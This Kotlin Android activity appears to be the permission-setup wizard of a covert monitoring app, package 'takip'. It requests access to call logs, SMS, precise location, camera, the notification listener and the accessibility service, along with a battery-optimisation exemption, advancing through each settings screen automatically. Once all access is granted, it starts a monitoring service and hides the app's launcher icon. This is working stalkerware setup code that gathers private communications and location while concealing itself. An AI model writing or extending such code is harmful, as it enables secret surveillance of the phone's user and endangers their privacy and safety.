package com.takip.app.ui

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.takip.app.R
import com.takip.app.databinding.ActivityPermissionWizardBinding
import com.takip.app.databinding.ItemPermissionStepBinding
import com.takip.app.service.MonitoringService
import com.takip.app.util.AppHider
import com.takip.app.util.PermissionChecker

class PermissionWizardActivity : AppCompatActivity() {

    private lateinit var binding: ActivityPermissionWizardBinding
    private val handler = Handler(Looper.getMainLooper())
    private var autoAdvance = true
    private var runtimeRequested = false

    private val runtimePermissions = mutableListOf(
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_SMS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityPermissionWizardBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.manualButton.setOnClickListener {
            autoAdvance = true
            openNextStep()
        }

        binding.finishButton.setOnClickListener { finishWizard() }

        updateSteps()
        handler.postDelayed({ openNextStep() }, 500)
    }

    override fun onResume() {
        super.onResume()
        updateSteps()
        if (autoAdvance) {
            handler.removeCallbacks(advanceRunnable)
            handler.postDelayed(advanceRunnable, 700)
        }
    }

    override fun onPause() {
        super.onPause()
        handler.removeCallbacks(advanceRunnable)
    }

    private val advanceRunnable = Runnable {
        if (allGranted()) {
            binding.finishButton.visibility = View.VISIBLE
            binding.statusText.text = getString(R.string.wizard_all_done)
            if (autoAdvance) finishWizard()
        } else {
            openNextStep()
        }
    }

    private fun openNextStep() {
        updateSteps()
        if (allGranted()) {
            binding.finishButton.visibility = View.VISIBLE
            if (autoAdvance) finishWizard()
            return
        }

        when {
            !runtimeGranted() -> {
                binding.statusText.text = getString(R.string.wizard_runtime)
                requestRuntimePermissions()
            }
            !notificationGranted() -> {
                binding.statusText.text = getString(R.string.wizard_notification)
                autoAdvance = false
                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            }
            !accessibilityGranted() -> {
                binding.statusText.text = getString(R.string.wizard_accessibility)
                autoAdvance = false
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            }
            !batteryGranted() -> {
                binding.statusText.text = getString(R.string.wizard_battery)
                autoAdvance = false
                requestBatteryExemption()
            }
        }
    }

    private fun requestRuntimePermissions() {
        val missing = runtimePermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isEmpty()) {
            autoAdvance = true
            handler.postDelayed(advanceRunnable, 400)
            return
        }
        if (!runtimeRequested) {
            runtimeRequested = true
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 100)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        updateSteps()
        autoAdvance = true
        handler.postDelayed(advanceRunnable, 500)
    }

    private fun requestBatteryExemption() {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (pm.isIgnoringBatteryOptimizations(packageName)) {
            autoAdvance = true
            handler.postDelayed(advanceRunnable, 400)
            return
        }
        try {
            startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
            })
        } catch (_: Exception) {
            startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
        }
    }

    private fun finishWizard() {
        MonitoringService.start(this)
        AppHider.hideLauncherIcon(this)
        finish()
    }

    private fun runtimeGranted(): Boolean {
        return runtimePermissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun notificationGranted(): Boolean {
        return PermissionChecker.getStatus(this).optBoolean("notifications")
    }

    private fun accessibilityGranted(): Boolean {
        return PermissionChecker.getStatus(this).optBoolean("accessibility")
    }

    private fun batteryGranted(): Boolean {
        return PermissionChecker.getStatus(this).optBoolean("batteryOptimization")
    }

    private fun allGranted(): Boolean {
        return runtimeGranted() && notificationGranted() && accessibilityGranted() && batteryGranted()
    }

    private fun updateSteps() {
        val done = listOf(
            runtimeGranted(),
            notificationGranted(),
            accessibilityGranted(),
            batteryGranted()
        ).count { it }

        binding.progressText.text = getString(R.string.wizard_progress, done, 4)
        styleStep(binding.stepRuntime, runtimeGranted(), getString(R.string.wizard_step_runtime))
        styleStep(binding.stepNotification, notificationGranted(), getString(R.string.wizard_step_notification))
        styleStep(binding.stepAccessibility, accessibilityGranted(), getString(R.string.wizard_step_accessibility))
        styleStep(binding.stepBattery, batteryGranted(), getString(R.string.wizard_step_battery))
    }

    private fun styleStep(step: ItemPermissionStepBinding, ok: Boolean, label: String) {
        step.stepTitle.text = label
        if (ok) {
            step.root.setBackgroundResource(R.drawable.bg_step_done)
            step.stepStatus.text = "✓"
            step.stepStatus.setTextColor(ContextCompat.getColor(this, R.color.step_done_text))
        } else {
            step.root.setBackgroundResource(R.drawable.bg_step_pending)
            step.stepStatus.text = "…"
            step.stepStatus.setTextColor(ContextCompat.getColor(this, R.color.step_pending_text))
        }
    }
}
